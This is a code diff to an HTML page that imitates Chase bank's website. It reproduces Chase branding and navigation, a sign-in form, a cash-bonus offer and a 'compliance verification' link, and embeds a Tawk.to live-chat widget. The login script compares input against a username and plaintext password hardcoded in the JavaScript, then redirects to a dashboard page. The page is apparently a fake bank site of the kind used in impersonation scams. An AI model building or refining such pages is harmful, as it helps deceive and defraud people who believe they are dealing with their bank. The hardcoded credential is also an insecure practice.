@@ -7,57 +7,188 @@
     <style>
         *, *::before, *::after { box-sizing:border-box; margin:0; padding:0; }
         body { font-family:"Helvetica Neue",Helvetica,Arial,sans-serif; line-height:1.5; color:#333; background:#fff; }
-        /* ... all your existing styles ... */
+        a { text-decoration:none; color:inherit; }
+        ul { list-style:none; }
         .container { max-width:1200px; margin:auto; padding:0 20px; }
         header { background:#fff; border-bottom:1px solid #e6e6e6; position:relative; }
-        /* ... rest of your CSS ... */
-        @media (max-width: 768px) { nav { display:none; } .hamburger { display:flex; } }
-
-        /* FINAL MOBILE FIX – KILLS FLASH INSTANTLY */
-        [id*="tawk"], [class*="tawk"], iframe[src*="tawk.to"], .tawk-branding, #tawkchat-minified-wrapper, #tawkchat-minified-container {
-            display: none !important; visibility: hidden !important; opacity: 0 !important;
-            width: 0 !important; height: 0 !important; overflow: hidden !important;
-            position: absolute !important; left: -9999px !important; z-index: -9999 !important;
+        .top-bar { display:flex; justify-content:space-between; align-items:center; padding:12px 0; font-size:14px; }
+        .top-bar a { margin:0 12px; }
+        .main-header { display:flex; align-items:center; justify-content:space-between; padding:20px 0; }
+        .logo-img { height:80px; width:auto; display:block; transition:transform .2s; }
+        .logo-img:hover { transform:scale(1.03); }
+        nav { display:flex; gap:30px; font-weight:500; }
+        nav a:hover { text-decoration:underline; }
+        .hamburger { display:none; flex-direction:column; cursor:pointer; gap:5px; }
+        .hamburger span { width:28px; height:3px; background:#0077c8; transition:0.3s; }
+        .hamburger.active span:nth-child(1) { transform:rotate(45deg) translate(6px,6px); }
+        .hamburger.active span:nth-child(2) { opacity:0; }
+        .hamburger.active span:nth-child(3) { transform:rotate(-45deg) translate(7px,-6px); }
+        .mobile-nav { display:none; flex-direction:column; background:#fff; position:absolute; top:100%; left:0; right:0; border-top:1px solid #e6e6e6; box-shadow:0 4px 12px rgba(0,0,0,.1); z-index:1000; }
+        .mobile-nav a { padding:14px 20px; border-bottom:1px solid #eee; font-weight:500; font-size:16px; }
+        .mobile-nav.open { display:flex; }
+        .hero { background:#0077c8; color:#fff; padding:60px 0; }
+        .hero .container { display:flex; flex-wrap:wrap; justify-content:space-between; align-items:flex-start; gap:40px; }
+        .hero-content { max-width:550px; }
+        .hero h1 { font-size:48px; margin-bottom:8px; }
+        .hero h2 { font-size:32px; margin-bottom:16px; }
+        .hero p { margin-bottom:24px; font-size:18px; }
+        .btn { display:inline-block; padding:12px 24px; border-radius:4px; font-weight:600; cursor:pointer; text-align:center; }
+        .btn-green { background:#2e7d32; color:#fff; }
+        .btn-blue { background:#0077c8; color:#fff; border:2px solid #fff; }
+        .login-box { background:#fff; padding:24px; border-radius:8px; width:320px; box-shadow:0 4px 12px rgba(0,0,0,.1); }
+        .login-box h3 { margin-bottom:16px; color:#333; font-size:18px; }
+        .login-box input[type=text], .login-box input[type=password] { width:100%; padding:10px; margin-bottom:12px; border:1px solid #ccc; border-radius:4px; font-size:14px; }
+        .login-box input.error { border-color:#d32f2f; box-shadow:0 0 0 3px rgba(211,47,47,.2); }
+        .login-box .checkbox { display:flex; align-items:center; margin-bottom:12px; font-size:13px; }
+        .login-box .checkbox input { margin-right:8px; }
+        .login-box .links { display:flex; flex-direction:column; font-size:13px; margin-top:16px; gap:8px; }
+        .login-box .links a { color:#0077c8; }
+        .btn-blue-solid { background:#0077c8; color:#fff; width:100%; border:none; padding:12px; font-size:16px; border-radius:4px; cursor:pointer; margin-top:12px; }
+        .btn-blue-solid:hover { background:#005ea6; }
+        .error-message { color:#d32f2f; font-size:13px; margin-top:8px; text-align:center; display:none; }
+        .compliance-btn { margin-top:24px; text-align:center; }
+        .compliance-btn .btn { background:#005eb8; color:white; font-weight:bold; padding:14px 28px; font-size:16px; border-radius:6px; box-shadow:0 4px 8px rgba(0,0,0,.2); }
+        .compliance-btn .btn:hover { background:#004494; }
+        @media (max-width: 992px) {
+            .hero .container { flex-direction:column; }
+            .login-box { width:100%; margin-top:20px; }
+        }
+        @media (max-width: 768px) {
+            nav { display:none; }
+            .hamburger { display:flex; }
+            .hero h1 { font-size:36px; }
+            .hero h2 { font-size:26px; }
         }
     </style>
 </head>
 <body>
-    <!-- Your entire page content (header, hero, login form) stays 100% unchanged -->
-    <!-- ... (everything you already have) ... -->
 
+    <!-- ===================== YOUR PAGE CONTENT ===================== -->
+    <header>
+        <div class="container top-bar">
+            <div>
+                <a href="#">Personal</a>
+                <a href="#">Business</a>
+                <a href="#">Commercial</a>
+            </div>
+            <div>
+                <a href="#">Schedule a meeting</a>
+                <a href="#">Customer service</a>
+                <a href="#">Español</a>
+                <a href="#">Search</a>
+            </div>
+        </div>
+        <div class="container main-header">
+            <a href="#">
+                <img src="https://i.postimg.cc/85C6FX9p/images-removebg-preview-1.png" alt="Chase Logo" class="logo-img">
+            </a>
+            <nav id="desktop-nav">
+                <a href="#">Checking</a><a href="#">Savings & CDs</a><a href="#">Credit cards</a><a href="#">Home loans</a><a href="#">Auto</a><a href="#">Investing by J.P. Morgan</a>
+            </nav>
+            <div class="hamburger" id="hamburger">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <nav class="mobile-nav" id="mobile-nav">
+            <a href="#">Checking</a><a href="#">Savings & CDs</a><a href="#">Credit cards</a><a href="#">Home loans</a><a href="#">Auto</a><a href="#">Investing by J.P. Morgan</a>
+        </nav>
+    </header>
+
+    <section class="hero">
+        <div class="container">
+            <div class="hero-content">
+                <h1>Enjoy $300</h1>
+                <h2>New Chase checking customers</h2>
+                <p>Open a Chase Total Checking® account with qualifying activities.</p>
+                <a href="#" class="btn btn-green">Open an account</a>
+            </div>
+            <div style="display:flex; flex-direction:column; align-items:flex-start;">
+                <div class="login-box">
+                    <h3>Welcome</h3>
+                    <form id="loginForm" onsubmit="return false;">
+                        <input type="text" id="username" placeholder="Username" required>
+                        <input type="password" id="password" placeholder="Password" required>
+                        <div class="checkbox">
+                            <input type="checkbox" id="remember">
+                            <label for="remember">Remember me</label>
+                            <a href="#" style="margin-left:auto; color:#0077c8;">Use token</a>
+                        </div>
+                        <div class="error-message" id="errorMsg"></div>
+                        <button type="button" class="btn-blue-solid" onclick="handleLogin()">Sign in</button>
+                        <div class="links">
+                            <a href="#">Forgot username/password?</a>
+                            <a href="#">Not enrolled? Sign up now.</a>
+                        </div>
+                    </form>
+                </div>
+                <div class="compliance-btn">
+                    <a href="second.html" class="btn" target="_blank" rel="noopener">
+                        Track your compliance verification
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- ===================== END OF YOUR CONTENT ===================== -->
+
+    <!-- ==================== TAWK.TO – NO FLASH, WORKS 100% ==================== -->
+    <script type="text/javascript">
+    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+    
+    Tawk_API.onLoad = function() {
+        Tawk_API.hideWidget();   // prevents the flash
+        Tawk_API.showWidget();   // then show it cleanly
+    };
+    
+    (function(){
+        var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+        s1.async = true;
+        s1.src = 'https://embed.tawk.to/691c98f28697631959e7b697/1jabrat1h';
+        s1.charset = 'UTF-8';
+        s1.setAttribute('crossorigin','*');
+        s0.parentNode.insertBefore(s1, s0);
+    })();
+    </script>
+    <!-- ==================== END TAWK.TO ==================== -->
+
+    <!-- Your existing JS (hamburger + login) -->
     <script>
-        // Your login + hamburger code (unchanged)
+        document.getElementById('hamburger').addEventListener('click', function() {
+            document.getElementById('mobile-nav').classList.toggle('open');
+            this.classList.toggle('active');
+        });
+
         const CORRECT_USERNAME = "gurusaransingh77";
         const CORRECT_PASSWORD = "Lucas092820!";
-        function handleLogin() { /* your code */ }
-        document.getElementById('password').addEventListener('keypress', e => { if(e.key==='Enter') handleLogin(); });
-        // hamburger code etc.
-    </script>
+        function handleLogin() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
+            const userField = document.getElementById('username');
+            const passField = document.getElementById('password');
 
-    <!-- FINAL FIX – NO FLASH ON MOBILE (iOS + Android) – 100% WORKING -->
-    <script type="text/javascript">
-        window.Tawk_API = window.Tawk_API || {};
-        window.Tawk_LoadStart = new Date();
-        Tawk_API.showWidget = function(){};
-        Tawk_API.maximize = function(){};
-        Tawk_API.popup = function(){};
-        Tawk_API.toggle = function(){};
-        Tawk_API.openWidget = function(){};
-        Tawk_API.onLoad = function() {
-            setInterval(() => {
-                document.querySelectorAll('iframe[src*="tawk.to"],[id*="tawk"],[class*="tawk"],.tawk-*').forEach(el => el.remove());
-            }, 30);
-        };
-    </script>
-    <script type="text/javascript">
-    (function(){
-        var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-        s1.async=true;
-        s1.src='https://embed.tawk.to/691c8ac3458429195a037440/1jabns3hq';
-        s1.charset='UTF-8';
-        s1.setAttribute('crossorigin','*');
-        s0.parentNode.insertBefore(s1,s0);
-    })();
+            errorMsg.style.display = 'none';
+            userField.classList.remove('error');
+            passField.classList.remove('error');
+
+            if (!username || !password) {
+                errorMsg.textContent = "Please enter both username and password.";
+                errorMsg.style.display = "block";
+                return;
+            }
+            if (username === CORRECT_USERNAME && password === CORRECT_PASSWORD) {
+                window.location.href = "dashboard.html";
+            } else {
+                errorMsg.textContent = "Username or password is incorrect.";
+                errorMsg.style.display = "block";
+                userField.classList.add('error');
+                passField.classList.add('error');
+            }
+        }
+
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') handleLogin();
+        });
     </script>
 
 </body>
